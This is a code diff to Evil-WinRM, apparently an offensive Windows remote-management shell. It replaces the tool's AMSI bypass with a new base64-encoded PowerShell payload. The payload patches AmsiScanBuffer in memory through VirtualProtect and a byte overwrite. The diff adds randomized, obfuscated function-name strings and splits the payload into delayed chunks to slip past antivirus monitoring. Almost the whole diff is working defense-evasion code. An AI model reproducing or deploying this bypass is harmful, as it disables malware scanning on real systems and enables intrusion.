@@ -100,6 +100,7 @@ class EvilWinRM
         @executables = Array.new
         @functions = Array.new
         @Bypass_4MSI_loaded = false
+        @blank_line = false
         @bypass_amsi_words_random_case = [
             "[Runtime.InteropServices.Marshal]",
             "function ",
@@ -728,6 +729,7 @@ class EvilWinRM
                             if timeToWait > 0
                                 puts()
                                 self.print_message("AV could be still watching for suspicious activity. Waiting for patching...", TYPE_WARNING, true, $logger)
+                                @blank_line = true
                                 sleep(timeToWait)
                             end
                             if !@Bypass_4MSI_loaded
@@ -804,14 +806,14 @@ class EvilWinRM
     end
 
     def generate_random_type_string()
-        to_randomize = self.random_case("System.Management.Automation.AmsiUtils")
+        to_randomize = "AmsiScanBuffer"
         result = ""
         to_randomize.chars.each { |c| result +=  "+#{(rand 2) == 0 ? (rand 2) == 0 ? self.get_char_raw(c): self.get_byte_expresion(c) : self.get_char_expresion(c)}"}
         result[1..-1]
     end
 
     def get_Bypass_4MSI()
-        bypass_template = "W1J1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpXcml0ZUJ5dGUoW1JlZl0uQXNzZW1ibHkuR2V0VHlwZSgiIiskdmFyMSsiIiwgJGZhbHNlLCAkdHJ1ZSkuR2V0RmllbGQoJycrJChbU3lzdGVtLk5ldC5XZWJVdGlsaXR5XTo6SHRtbERlY29kZSgnJiM5NzsmIzEwOTsmIzExNTsmIzEwNTsnKSkrJ0NvbnRleHQnLFtSZWZsZWN0aW9uLkJpbmRpbmdGbGFnc10nTm9uUHVibGljLFN0YXRpYycpLkdldFZhbHVlKCRudWxsKSw1KQo="
+        bypass_template = "JGNvZGUgPSBAIgp1c2luZyBTeXN0ZW07CnVzaW5nIFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlczsKcHVibGljIGNsYXNzIGNvZGUgewogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIEludFB0ciBHZXRQcm9jQWRkcmVzcyhJbnRQdHIgaE1vZHVsZSwgc3RyaW5nIHByb2NOYW1lKTsKICAgIFtEbGxJbXBvcnQoImtlcm5lbDMyIildCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBJbnRQdHIgTG9hZExpYnJhcnkoc3RyaW5nIG5hbWUpOwogICAgW0RsbEltcG9ydCgia2VybmVsMzIiKV0KICAgIHB1YmxpYyBzdGF0aWMgZXh0ZXJuIGJvb2wgVmlydHVhbFByb3RlY3QoSW50UHRyIGxwQWRkcmVzcywgVUludFB0ciBydW9xeHAsIHVpbnQgZmxOZXdQcm90ZWN0LCBvdXQgdWludCBscGZsT2xkUHJvdGVjdCk7Cn0KIkAKQWRkLVR5cGUgJGNvZGUKJGZqdGZxd24gPSBbY29kZV06OkxvYWRMaWJyYXJ5KCJhbXNpLmRsbCIpCiNqdW1wCiRqeXV5amcgPSBbY29kZV06OkdldFByb2NBZGRyZXNzKCRmanRmcXduLCAiIiskdmFyMSsiIikKJHAgPSAwCiNqdW1wCiRudWxsID0gW2NvZGVdOjpWaXJ0dWFsUHJvdGVjdCgkanl1eWpnLCBbdWludDMyXTUsIDB4NDAsIFtyZWZdJHApCiRmbnh5ID0gIjB4QjgiCiRmbXh5ID0gIjB4NTciCiRld2FxID0gIjB4MDAiCiR3ZnRjID0gIjB4MDciCiRuZHVnID0gIjB4ODAiCiRobXp4ID0gIjB4QzMiCiNqdW1wCiRsbGZhbSA9IFtCeXRlW11dICgkZm54eSwkZm14eSwkZXdhcSwkd2Z0YywrJG5kdWcsKyRobXp4KQokbnVsbCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkNvcHkoJGxsZmFtLCAwLCAkanl1eWpnLCA2KSA="
         dec_template = Base64.decode64(bypass_template)
         result = dec_template.gsub("$var1", self.generate_random_type_string())
         @bypass_amsi_words_random_case.each {|w| result.gsub!("#{w}", self.random_case(w)) }
@@ -820,6 +822,16 @@ class EvilWinRM
 
     def load_Bypass_4MSI(shell)
         bypass = self.get_Bypass_4MSI()
+
+        if !@blank_line then
+            puts()
+        end
+        self.print_message("Patching 4MSI, please be patient...", TYPE_INFO, true)
+        bypass.split("#jump").each do |item|
+            output = shell.run(item)
+            sleep(2)
+        end
+
         output = shell.run(bypass)
         if output.output.empty? then
             self.print_message("[+] Success!", TYPE_SUCCESS, false)
